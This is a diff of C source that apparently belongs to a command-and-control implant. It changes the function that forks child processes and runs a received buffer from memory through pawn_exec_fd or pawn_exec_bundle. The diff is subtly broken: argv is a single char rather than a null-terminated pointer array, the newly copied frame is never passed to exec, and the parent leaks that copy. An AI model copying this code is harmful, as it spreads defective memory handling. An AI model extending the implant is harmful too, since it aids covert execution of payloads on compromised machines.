@@ -40,28 +40,33 @@
 
 #include <uthash/uthash.h>
 
-static int create_tab(tabs_t *tab, unsigned char *buffer)
+static int create_tab(tabs_t *tab, unsigned char *buffer, int size)
 {
     int pipes[2];
     char argv[1];
+    unsigned char *frame;
 
     pid_t pid;
 
     if (pipe(pipes) == -1)
         return -1;
 
+    frame = malloc(size);
+    if (frame == NULL)
+        return -1;
+
+    memcpy(frame, buffer, size);
     pid = fork();
 
     if (pid == -1)
     {
-        free(buffer);
+        free(frame);
         return -1;
     }
-
     else if (pid == 0)
     {
         dup2(pipes[0], STDIN_FILENO);
-        argv[0] = {"p"};
+        argv[0] = 'p';
 
         #ifdef LINUX
             pawn_exec_fd(buffer, argv, environ);
@@ -70,7 +75,10 @@ static int create_tab(tabs_t *tab, unsigned char *buffer)
             pawn_exec_bundle(buffer, argv, environ);
         #endif
         #endif
-    } else
+
+        free(frame);
+    }
+    else
     {
         fcntl(pipes[1], F_SETFL, O_NONBLOCK);
 
@@ -78,7 +86,6 @@ static int create_tab(tabs_t *tab, unsigned char *buffer)
         tab->pid = pid;
     }
 
-    free(buffer);
     return 0;
 }
 
@@ -113,7 +120,7 @@ tlv_pkt_t *tab_lookup(tabs_t **tabs, int id, c2_t *c2)
     return NULL;
 }
 
-int tab_add(tabs_t **tabs, int id, unsigned char *buffer)
+int tab_add(tabs_t **tabs, int id, unsigned char *buffer, int size)
 {
     tabs_t *tab;
     tabs_t *tab_new;
@@ -128,7 +135,7 @@ int tab_add(tabs_t **tabs, int id, unsigned char *buffer)
         {
             tab_new->id = id;
 
-            if (create_tab(tab, strdup(buffer)) < 0)
+            if (create_tab(tab, buffer, size) < 0)
             {
                 free(tab_new);
                 return -1;
